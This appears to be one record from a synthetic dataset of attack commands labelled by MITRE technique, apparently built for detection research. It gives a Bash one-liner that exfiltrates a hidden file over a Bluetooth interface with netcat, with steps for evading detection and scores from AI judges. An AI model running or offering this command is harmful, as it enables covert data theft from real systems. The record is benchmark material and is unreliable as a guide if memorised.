@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i bnep0 -nn tcp port 53211 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.44.10 192.168.44.20 53211 < /var/tmp/.cache/img.dat",
+  "explanation": "Exfiltrates data over a Bluetooth PAN interface (bnep0) using a high, uncommon TCP port while passively monitoring only that flow with tcpdump. This leverages a non-primary network medium, aligning with T1011.",
+  "rationale_steps": [
+    "Bind transfer to Bluetooth PAN (bnep0) to use an alternate medium.",
+    "Choose uncommon TCP port 53211 to reduce detection.",
+    "Start tcpdump on bnep0 for that port and discard output to avoid artifacts.",
+    "Send the file using netcat with -s to pin the source to the bnep0 IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-00c22397",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are correctly separated with &, flags and filter expression are valid, and redirections are well-formed.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates via a Bluetooth PAN IP using nc and monitors that flow with tcpdump on bnep0, but success depends on tcpdump capture capabilities and the presence of a listening service at 192.168.44.20:53211.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:15:54.544116Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both tcpdump and netcat, and correct command chaining with background process handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by exfiltrating data over a Bluetooth network interface (bnep0) using netcat on an uncommon port (53211) while monitoring the traffic with tcpdump, providing a covert alternative network medium for data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:15:59.882019Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, utilizing valid Linux utilities (nohup, tcpdump, nc), correct flags, arguments, redirections, and command separators, making it fully parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "The `nc` portion correctly exfiltrates data via a high TCP port on a Bluetooth PAN interface, aligning well with T1011, but the `tcpdump` component for monitoring would likely fail without root privileges, contradicting the 'Privilege: None' claim.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T06:27:54.778195Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
